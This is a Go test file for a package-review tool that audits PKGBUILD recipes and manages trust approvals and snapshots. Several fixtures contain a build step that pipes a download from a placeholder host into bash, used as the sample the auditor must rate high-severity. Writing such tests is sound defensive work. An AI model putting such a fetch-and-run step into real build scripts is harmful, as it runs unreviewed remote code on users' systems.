package service

import (
	"context"
	"errors"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/Hayao0819/Kamisato/internal/vcs/git"
	"github.com/Hayao0819/Kamisato/kayo/audit"
	"github.com/Hayao0819/Kamisato/kayo/audit/llm"
	kayoconfig "github.com/Hayao0819/Kamisato/kayo/config"
	"github.com/Hayao0819/Kamisato/kayo/trust"
	gogit "github.com/go-git/go-git/v6"
	"github.com/go-git/go-git/v6/plumbing/object"
)

func TestReviewLocalTargetPolicy(t *testing.T) {
	for _, tc := range []struct {
		name    string
		recipe  string
		options ReviewOptions
		wantErr string
		wantMax audit.Severity
	}{
		{"audit clean", "pkgname=clean\nbuild() { make; }\n", ReviewOptions{}, "", audit.SevInfo},
		{"audit high", "pkgname=evil\nbuild() { curl https://example.invalid/p | bash; }\n", ReviewOptions{}, "high-severity", audit.SevHigh},
		{"approve high refused", "pkgname=evil\nbuild() { curl https://example.invalid/p | bash; }\n", ReviewOptions{Approve: true}, "refusing to trust", audit.SevHigh},
		{"force still requires commit", "pkgname=evil\nbuild() { curl https://example.invalid/p | bash; }\n", ReviewOptions{Approve: true, Force: true}, "not a git repository", audit.SevHigh},
	} {
		t.Run(tc.name, func(t *testing.T) {
			dir := t.TempDir()
			if err := os.WriteFile(filepath.Join(dir, "PKGBUILD"), []byte(tc.recipe), 0o600); err != nil {
				t.Fatal(err)
			}
			store := filepath.Join(t.TempDir(), "trust.json")
			cfg := &kayoconfig.KayoConfig{TrustStore: store}
			result, err := Review(context.Background(), cfg, dir, tc.options, nil)
			if tc.wantErr == "" && err != nil {
				t.Fatal(err)
			}
			if tc.wantErr != "" && (err == nil || !strings.Contains(err.Error(), tc.wantErr)) {
				t.Fatalf("error = %v, want %q", err, tc.wantErr)
			}
			if result == nil || result.Report.Max() != tc.wantMax || result.Approved {
				t.Fatalf("result = %+v", result)
			}
			if _, err := os.Stat(store); !os.IsNotExist(err) {
				t.Fatalf("review without approval wrote trust state: %v", err)
			}
		})
	}
}

func TestReviewAdvisoryFailureIsNotAGate(t *testing.T) {
	dir := t.TempDir()
	if err := os.WriteFile(filepath.Join(dir, "PKGBUILD"), []byte("pkgname=clean\nbuild() { make; }\n"), 0o600); err != nil {
		t.Fatal(err)
	}
	cfg := &kayoconfig.KayoConfig{TrustStore: filepath.Join(t.TempDir(), "trust.json")}
	wantErr := errors.New("injected advisory failure")
	called := false
	result, err := Review(context.Background(), cfg, dir, ReviewOptions{}, func(_ context.Context, gotDir string) (*llm.Advisory, error) {
		called = true
		if gotDir != dir {
			t.Fatalf("advisory target = %q, want %q", gotDir, dir)
		}
		return nil, wantErr
	})
	if err != nil {
		t.Fatalf("advisory must not change the exit status: %v", err)
	}
	if !called || result == nil || !errors.Is(result.AdvisoryErr, wantErr) || result.Advisory != nil {
		t.Fatalf("result = %+v", result)
	}
}

const cleanLocalRecipe = "pkgname=realbase\npkgver=1.0.0\npkgrel=1\narch=(x86_64)\nbuild() { make; }\n"

func newLocalReviewRepository(t *testing.T) (string, string) {
	t.Helper()
	dir := t.TempDir()
	if _, err := gogit.PlainInit(dir, false); err != nil {
		t.Fatal(err)
	}
	commit := commitLocalReviewFiles(t, dir, map[string]string{"PKGBUILD": cleanLocalRecipe, ".SRCINFO": validSrcinfo})
	return dir, commit
}

func commitLocalReviewFiles(t *testing.T, dir string, files map[string]string) string {
	t.Helper()
	for name, contents := range files {
		if err := os.WriteFile(filepath.Join(dir, name), []byte(contents), 0o600); err != nil {
			t.Fatal(err)
		}
	}
	repository, err := gogit.PlainOpen(dir)
	if err != nil {
		t.Fatal(err)
	}
	worktree, err := repository.Worktree()
	if err != nil {
		t.Fatal(err)
	}
	if err := worktree.AddWithOptions(&gogit.AddOptions{All: true}); err != nil {
		t.Fatal(err)
	}
	commit, err := worktree.Commit("local review fixture", &gogit.CommitOptions{Author: &object.Signature{Name: "fixture", Email: "fixture@example.invalid"}})
	if err != nil {
		t.Fatal(err)
	}
	return commit.String()
}

func TestReviewLocalApprovalUsesSnapshotDuringAdvisory(t *testing.T) {
	dir, commit := newLocalReviewRepository(t)
	cfg := &kayoconfig.KayoConfig{CacheDir: filepath.Join(t.TempDir(), "cache"), TrustStore: filepath.Join(t.TempDir(), "trust.json")}
	called := false
	result, err := Review(context.Background(), cfg, dir, ReviewOptions{Approve: true}, func(_ context.Context, snapshot string) (*llm.Advisory, error) {
		called = true
		if snapshot == dir {
			t.Fatal("approval must not audit the caller's mutable working tree")
		}
		newCommit := commitLocalReviewFiles(t, dir, map[string]string{
			"PKGBUILD": "build() { curl https://example.invalid/p | bash; }\n",
			".SRCINFO": strings.ReplaceAll(validSrcinfo, "realbase", "changed-base"),
		})
		if newCommit == commit {
			t.Fatal("fixture failed to advance the original HEAD")
		}
		if contents, err := os.ReadFile(filepath.Join(snapshot, "PKGBUILD")); err != nil || string(contents) != cleanLocalRecipe {
			t.Fatalf("snapshot changed with the source: contents=%q, error=%v", contents, err)
		}
		return &llm.Advisory{Summary: "reviewed the fixed snapshot"}, nil
	})
	if err != nil || !called || result == nil || !result.Approved || result.Report.Max() != audit.SevInfo {
		t.Fatalf("called=%v, result=%+v, error=%v", called, result, err)
	}
	if result.Resolved.Pkgbase != "realbase" || result.Resolved.Commit != commit || result.Resolved.Source != "local" {
		t.Fatalf("approval provenance changed with the source: %+v", result.Resolved)
	}
	store, err := trust.Open(cfg.TrustStore)
	if err != nil {
		t.Fatal(err)
	}
	approval, ok := store.Approval("realbase")
	if !ok || approval.Commit != commit || approval.AuditMax != audit.SevInfo.String() {
		t.Fatalf("approval does not describe the audited snapshot: %+v", approval)
	}
	if _, ok := store.Approval("changed-base"); ok {
		t.Fatal("approval used metadata changed during the advisory")
	}
	if head, err := git.HeadCommit(context.Background(), filepath.Join(cfg.ServedRoot(), "realbase.git")); err != nil || head != commit {
		t.Fatalf("served HEAD=%q, error=%v, want %q", head, err, commit)
	}
	if _, err := os.Stat(result.Resolved.Dir); !os.IsNotExist(err) {
		t.Fatalf("owned snapshot was not cleaned: %v", err)
	}
	if _, err := os.Stat(dir); err != nil {
		t.Fatalf("approval cleaned the caller's directory: %v", err)
	}
}

func TestReviewRejectsTrackedDirtyLocalApproval(t *testing.T) {
	for _, name := range []string{"PKGBUILD", ".SRCINFO"} {
		t.Run(name, func(t *testing.T) {
			dir, _ := newLocalReviewRepository(t)
			if err := os.WriteFile(filepath.Join(dir, name), []byte("uncommitted content\n"), 0o600); err != nil {
				t.Fatal(err)
			}
			cfg := &kayoconfig.KayoConfig{CacheDir: filepath.Join(t.TempDir(), "cache"), TrustStore: filepath.Join(t.TempDir(), "trust.json")}
			result, err := Review(context.Background(), cfg, dir, ReviewOptions{Approve: true, Force: true}, func(context.Context, string) (*llm.Advisory, error) {
				t.Fatal("dirty approval must fail before the advisory or publish")
				return nil, nil
			})
			if result != nil || err == nil || !strings.Contains(err.Error(), "uncommitted changes") {
				t.Fatalf("result=%+v, error=%v; want dirty rejection", result, err)
			}
			for _, path := range []string{cfg.TrustStore, cfg.CacheDir} {
				if _, err := os.Stat(path); !os.IsNotExist(err) {
					t.Fatalf("rejected approval modified %s: %v", path, err)
				}
			}
		})
	}
}

func TestReviewLocalAuditRetainsWorkingTree(t *testing.T) {
	dir, commit := newLocalReviewRepository(t)
	for name, contents := range map[string]string{
		"PKGBUILD": "build() { curl https://example.invalid/p | bash; }\n",
		".SRCINFO": strings.ReplaceAll(validSrcinfo, "realbase", "working-base"),
	} {
		if err := os.WriteFile(filepath.Join(dir, name), []byte(contents), 0o600); err != nil {
			t.Fatal(err)
		}
	}
	cfg := &kayoconfig.KayoConfig{TrustStore: filepath.Join(t.TempDir(), "trust.json")}
	result, err := Review(context.Background(), cfg, dir, ReviewOptions{}, func(_ context.Context, gotDir string) (*llm.Advisory, error) {
		if gotDir != dir {
			t.Fatalf("ordinary audit must inspect the working tree: %q", gotDir)
		}
		return nil, nil
	})
	if err == nil || !strings.Contains(err.Error(), "high-severity") || result == nil || result.Report.Max() != audit.SevHigh {
		t.Fatalf("result=%+v, error=%v; want working-tree findings", result, err)
	}
	if result.Resolved.Dir != dir || result.Resolved.Pkgbase != "working-base" || result.Resolved.Commit != commit {
		t.Fatalf("working-tree audit provenance=%+v", result.Resolved)
	}
	if _, err := os.Stat(dir); err != nil {
		t.Fatalf("ordinary audit removed its input: %v", err)
	}
}

func TestReviewLocalRefUsesSelectedCommit(t *testing.T) {
	dir, commit := newLocalReviewRepository(t)
	head := commitLocalReviewFiles(t, dir, map[string]string{
		"PKGBUILD": "build() { curl https://example.invalid/p | bash; }\n",
		".SRCINFO": strings.ReplaceAll(validSrcinfo, "realbase", "head-base"),
	})
	if err := os.WriteFile(filepath.Join(dir, ".SRCINFO"), []byte(strings.ReplaceAll(validSrcinfo, "realbase", "dirty-base")), 0o600); err != nil {
		t.Fatal(err)
	}
	cfg := &kayoconfig.KayoConfig{CacheDir: t.TempDir(), TrustStore: filepath.Join(t.TempDir(), "trust.json")}
	result, err := Review(context.Background(), cfg, dir, ReviewOptions{Ref: commit, Approve: true}, nil)
	if err != nil || result == nil || !result.Approved || result.Report.Max() != audit.SevInfo {
		t.Fatalf("explicit local ref review=%+v, error=%v", result, err)
	}
	if result.Resolved.Commit != commit || result.Resolved.Pkgbase != "realbase" {
		t.Fatalf("explicit ref must select commit and metadata together: %+v", result.Resolved)
	}
	if current, err := git.HeadCommit(context.Background(), dir); err != nil || current != head {
		t.Fatalf("approval changed the original HEAD: %q, error=%v", current, err)
	}
	if served, err := git.HeadCommit(context.Background(), filepath.Join(cfg.ServedRoot(), "realbase.git")); err != nil || served != commit {
		t.Fatalf("served commit=%q, error=%v, want explicit ref %q", served, err, commit)
	}
	if _, err := os.Stat(result.Resolved.Dir); !os.IsNotExist(err) {
		t.Fatalf("explicit-ref snapshot was not cleaned: %v", err)
	}
}
